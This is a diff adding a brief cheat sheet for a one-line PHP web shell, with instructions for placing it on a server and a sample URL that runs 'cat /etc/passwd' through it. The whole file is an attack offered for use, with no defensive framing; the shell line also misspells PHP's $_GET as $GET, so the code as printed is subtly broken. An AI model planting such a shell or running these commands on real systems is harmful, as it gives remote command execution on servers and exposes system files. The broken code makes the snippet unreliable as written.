@@ -1,0 +1,13 @@
+One line PHP SHELL:
+
+<?php system($GET['cmd']);?>
+
+Command to run in URL:
+  Replace IP with server containing php shell file
+  Replace "phpfile" with the name of the shell file
+  This runs command to get /etc/passwd. This can be replaced.
+  
+192.168.1.1/phpfile.php?cmd=cat%20/etc/passwd
+
+
+NOTE: Spaces don't work in a URL. Replace a space with %20.
